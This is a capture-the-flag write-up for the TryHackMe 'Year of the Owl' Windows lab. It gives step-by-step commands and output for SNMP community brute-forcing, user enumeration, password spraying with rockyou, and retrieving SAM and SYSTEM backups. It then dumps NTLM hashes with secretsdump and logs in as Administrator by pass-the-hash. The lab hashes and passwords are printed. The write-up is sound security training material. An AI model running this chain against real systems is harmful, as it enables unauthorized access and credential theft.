# TryHackMe-Year of The Owl

**Scope:**

- SNMP (Simple Network Management Protocol)
- SMB (Server Message Block)
- RDP (Remote Desktop Protocol)
- WinRM (Windows Remote Management)

**Keywords:**

- $Recycle.Bin
- SID (Security Identifier)
- Backup Files
- SAM (Security Account Manager)
- SAM Database
- NTLMHash
- LMHash
- RID (Relative Identifier)

**Main Commands:**

- `nmap -sV -sC -sU -Pn -T4 -A -p- --min-rate=300 --max-retries=3 -oN nmap_result.txt $target_ip`
- `onesixtyone $target_ip -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt`
- `hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -q $target_ip snmp`
- `snmpwalk -c openview -v1 $target_ip 1.3.6.1.4.1.77.1.2.25 -n -f`
- `crackmapexec smb $target_ip -u Jareth -p /usr/share/wordlists/rockyou.txt --pass-pol --content`
- `evil-winrm -u Jareth -p sarah -i $target_ip`
- `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak local`
- `evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i $target_ip`
- `evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i $target_ip`

**System Commands:**

- `whoami /all | Select-String -Pattern "jareth" -Context 2.0`
- `Get-ComputerInfo | Select-Object CsName,WindowsVersion,WindowsBuildLabEx`
- `gci -hidden .`
- `gci -path 'C:\$Recycle.Bin' -h`

### Laboratory Environment

[Year of the Owl](https://tryhackme.com/r/room/yearoftheowl)

### Penetration Approaches and Commands

> **Network Enumeration Phase**
> 

`nmap -sV -sC -sU -Pn -T4 -A -p- --min-rate=300 --max-retries=3 -oN nmap_result.txt $target_ip`

```bash
[REDACTED] - PORT AND VERSION INFORMATION
```

> **SNMP (Simple Network Management Protocol)**
> 

`onesixtyone $target_ip -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt`

```bash
Scanning 1 hosts, 3218 communities
10.10.211.238 [openview] Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
```

`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -q $target_ip snmp`

```bash
[DATA] max 16 tasks per 1 server, overall 16 tasks, 118 login tries (l:1/p:118), ~8 tries per task
[DATA] attacking snmp://10.10.211.238:161/
[161][snmp] host: 10.10.211.238   password: openview
```

`nmap --script "snmp* and not snmp-brute" -T4 -A -O 10.10.211.238 -oN nmap_snmp_result.txt`

```bash
Nmap scan report for 10.10.211.238
Host is up (0.38s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.10)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.10
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   NULL: 
|_    Host 'ip-10-2-37-37.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

`snmpwalk -c openview -v1 $target_ip 1.3.6.1.4.1.77.1.2.25 -n -f`

```bash
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.6.74.97.114.101.116.104 = STRING: "Jareth"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
```

`snmp-check $target_ip -c openview -p 161`

```bash
[*] System information:

  Host IP address               : 10.10.211.238
  Hostname                      : year-of-the-owl
  Description                   : Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 17763 Multiprocessor Free)
  Contact                       : -
  Location                      : -
  Uptime snmp                   : 00:42:14.64
  Uptime system                 : 00:41:27.21
  System date                   : 2024-9-6 21:24:53.4
  Domain                        : WORKGROUP

[*] User accounts:

  Guest               
  Jareth              
  Administrator       
  DefaultAccount      
  WDAGUtilityAccount  

[*] Network information:

  IP forwarding enabled         : no
  Default TTL                   : 128
  TCP segments received         : 2602
  TCP segments sent             : 567
  TCP segments retrans          : 266
  Input datagrams               : 139581
  Delivered datagrams           : 6087
  Output datagrams              : 935

[REDACTED]
```

> **SMB (Server Message Block)**
> 

`crackmapexec smb $target_ip -u Jareth -p /usr/share/wordlists/rockyou.txt --pass-pol --content` 

```bash
10.10.211.238   445    YEAR-OF-THE-OWL  [+] year-of-the-owl\Jareth:sarah 
```

`smbclient -L $target_ip --user Jareth`

```bash
Password for [WORKGROUP\Jareth]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```

> **RDP (Remote Desktop Protocol)**
> 

`hydra -l Jareth -P /usr/share/wordlists/rockyou.txt $target_ip rdp`

```bash
[REDACTED] - SAME PASSWORD
```

> **WinRM (Windows Remote Management)**
> 

`crackmapexec winrm $target_ip -u Jareth -p /usr/share/wordlists/rockyou.txt | grep ‘(Pwn3d!)’`

```bash
[REDACTED] - SAME PASSWORD
```

`evil-winrm -u Jareth -p sarah -i $target_ip`

```bash
*Evil-WinRM* PS C:\Users\Jareth\Documents> whoami /all | Select-String -Pattern "jareth" -Context 2.0

  User Name              SID
  ====================== =============================================
*> year-of-the-owl\jareth S-1-5-21-1987495829-162890*2820-919763334-1001

*Evil-WinRM* PS C:\Users\Jareth\Documents> Get-ComputerInfo | Select-Object CsName,WindowsVersion,WindowsBuildLabEx

CsName WindowsVersion WindowsBuildLabEx
------ -------------- -----------------
       1809           17763.1.amd64fre.rs5_release.180914-1434

*Evil-WinRM* PS C:\Users\Jareth\Documents> cd C:\
*Evil-WinRM* PS C:\> gci -hidden .

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   2:14 AM                $Recycle.Bin
d--hsl        9/17/2020   7:27 PM                Documents and Settings
d--h--        9/18/2020   2:04 AM                ProgramData
d--hs-        9/17/2020   7:27 PM                Recovery
d--hs-        9/17/2020   7:26 PM                System Volume Information
-a-hs-         9/6/2024   8:43 PM     1207959552 pagefile.sys

*Evil-WinRM* PS C:\> gci -path 'C:\$Recycle.Bin' -h

    Directory: C:\$Recycle.Bin

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        9/18/2020   7:28 PM                S-1-5-21-1987495829-1628902820-919763334-1001
d--hs-       11/13/2020  10:41 PM                S-1-5-21-1987495829-1628902820-919763334-500

*Evil-WinRM* PS C:\> cd 'C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001'
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> dir

    Directory: C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak

*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> move .\system.bak c:\users\jareth\documents\system.bak
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> move .\sam.bak c:\users\jareth\documents\sam.bak
*Evil-WinRM* PS C:\$Recycle.Bin\S-1-5-21-1987495829-1628902820-919763334-1001> cd c:\users\jareth\documents\
*Evil-WinRM* PS C:\users\jareth\documents> dir

    Directory: C:\users\jareth\documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2020   7:28 PM          49152 sam.bak
-a----        9/18/2020   7:28 PM       17457152 system.bak

*Evil-WinRM* PS C:\users\jareth\documents> download system.bak
Info: Downloading system.bak to ./system.bak

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\users\jareth\documents> download sam.bak
Info: Downloading sam.bak to ./sam.bak

                                                             
Info: Download successful!

```

> **Cracking Backup Files & Privilege Escalation**
> 

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak local`

```bash

[*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up...
```

`evil-winrm -u Administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a -i $target_ip`

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
year-of-the-owl\administrator
```

`evil-winrm -u administrator -p aad3b435b51404eeaad3b435b51404ee:6bc99ede9edcfecf9662fb0c0ddcfa7a -i $target_ip` 

```bash
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
year-of-the-owl\administrator
```

# Appendix

## **SNMP (Simple Network Management Protocol)**

<aside>
💡

SNMP (Simple Network Management Protocol) is a widely used protocol for managing and monitoring devices on a network. It allows administrators to gather information from network devices, such as routers, switches, servers, printers, and more, to track their performance, identify issues, and control their behavior.

</aside>

<aside>
💡

SNMP community strings are a form of authentication used in SNMP (Simple Network Management Protocol) versions 1 and 2c. These strings act as passwords that control access to the managed devices' data. Community strings determine what level of access an SNMP manager (or Network Management Station, NMS) has to the information stored by SNMP agents on network devices.

</aside>

<aside>
💡

A Management Information Base (MIB) is a hierarchical database used by network devices that implement the Simple Network Management Protocol (SNMP) to organize and store management data. The MIB defines the structure of the data available for a network management system (NMS) to query or modify on managed devices. It provides a standardized way for different types of devices to represent information, making it easier to monitor and manage them. The MIB is organized as a tree-like hierarchy, with each node representing a specific object (or piece of data) related to network management. Every node in this hierarchy has a unique identifier known as an **Object Identifier (OID)**. OIDs are a sequence of numbers that describe the path to the object within the tree. The top level of the tree starts with a root node, and from there, it branches into various categories.

</aside>

Example of OID structure:

- Root: .1 (ISO)
- .1.3 (ISO identified organization)
- .1.3.6 (US Department of Defense)
- .1.3.6.1 (Internet)
- .1.3.6.1.2 (Management)
- .1.3.6.1.2.1 (MIB-2)

A MIB contains managed objects, which represent the data points related to the configuration, status, performance, and counters of network devices. Each object is defined by:

- Object Identifier (OID): A numerical sequence that uniquely identifies each object in the tree.
- Object Name: A human-readable identifier that corresponds to the OID.
- Syntax: The data type and format of the object (e.g., integer, string, counter).
- Access Type: Specifies whether the object is read-only, read-write, or write-only.
- Description: A brief explanation of the object's purpose.

<aside>
💡

The default location of the username list is: `1.3.6.1.4.1.77.1.2.25`. This particular OID points to the location in the MIB where the list of usernames can be found on a network device.

</aside>

## SMB (Server Message Block)

<aside>
💡

Server Message Block (SMB) is a network protocol used for sharing files, printers, and other resources between computers in a network. It allows computers to read and write to files, request services, and communicate with network devices like printers and servers. SMB is mainly used in Windows environments but is also supported by Linux and macOS systems.

</aside>

<aside>
💡

In a Windows domain, SMB allows centralized file sharing and resource access, with users authenticated via Active Directory.

</aside>

<aside>
💡

In the context of SMB (Server Message Block), a share refers to a network resource such as a file directory, printer, or device that is made available to other users or computers on the network.

</aside>

## RDP (Remote Desktop Protocol)

<aside>
💡

Remote Desktop Protocol (RDP) is a proprietary network protocol developed by Microsoft that allows users to remotely connect to and control another computer over a network. It is primarily used to enable remote access to a Windows-based machine, allowing users to interact with the graphical interface of the remote computer as if they were sitting in front of it. RDP provides a graphical interface, allowing users to see the remote desktop, open files, run programs, and use peripherals like printers and storage devices remotely. RDP works over TCP port 3389 by default, although it can be configured to use a different port.

</aside>

## WinRM (Windows Remote Management)

<aside>
💡

Windows Remote Management (WinRM) is a Windows-native protocol and service that allows administrators to remotely manage computers, execute commands, and retrieve system information over a network. It is based on the Web Services for Management (WS-Management) protocol, which is a standards-based, firewall-friendly protocol used for managing devices and systems. WinRM listens for incoming management requests over HTTP (default port 5985) or HTTPS (default port 5986), allowing secure and firewall-friendly communication.

</aside>

## Notes

<aside>
💡

`$Recycle.Bin` is a hidden system folder on Windows operating systems that serves as the Recycle Bin for each user account. $Recycle.Bin is where deleted files and folders are stored temporarily before they are permanently deleted. When a user deletes a file or folder from their system (using the Delete key or right-clicking and selecting "Delete"), Windows moves the item to the Recycle Bin rather than permanently deleting it immediately.

</aside>

<aside>
💡

SID stands for Security Identifier. It is a unique alphanumeric string assigned to each security principal (such as a user, group, or computer) in Windows operating systems. The SID is used internally by Windows to identify and manage security relationships and access control. 

</aside>

<aside>
💡

The `.bak` files typically denote backups, which could contain important system or configuration data.

</aside>

<aside>
💡

SAM (Security Account Manager) is a database in Windows operating systems that stores user account information, including the hashed passwords of users for local authentication. The SAM file is located in the directory `C:\Windows\System32\Config\` on a Windows machine. It holds security-related information for local user accounts and groups.

</aside>

<aside>
💡

SAM stores passwords in hashed form using algorithms such as NTLM (NT LAN Manager) and LM (LAN Manager) hashes. The SAM file is highly protected and cannot be easily accessed while the system is running. Only processes running with SYSTEM privileges can access it directly.  In modern versions of Windows, the data within SAM is encrypted using SYSKEY, which further enhances protection. SYSKEY was a mechanism introduced to encrypt the password hashes in the SAM file.

</aside>

<aside>
💡

The SAM database is stored as a registry hive under `HKEY_LOCAL_MACHINE\SAM`.

</aside>

<aside>
💡

NTLMHash is a hash of the user's password used in the NTLM (NT LAN Manager) authentication protocol. It is part of the Windows security model and is used for authenticating users on Windows networks. A typical NTLMHash might look like `6C8F0B4A98D84DD8F9D8B7F5E3D9C49F`

</aside>

<aside>
💡

LMHash is a hash of the user's password used in older versions of Windows (prior to Windows NT). It is part of the LAN Manager authentication protocol. A typical LMHash might look like `AAD3B435B51404EEAAD3B435B51404EE` for an empty password or `6F1D7D2C1D6CE7391D5F9A9795ECAB03` for an actual password.

</aside>

<aside>
💡

RID (Relative Identifier) is a unique number assigned to each user account and group in a Windows system. It is part of the Security Identifier (SID), which is used to uniquely identify security principals (users, groups, etc.) in Windows. For example, the SID for the local Administrator account might look like `S-1-5-21-1004336348-1177238915-682003330-500`, where `500` is the RID for the Administrator account.

</aside>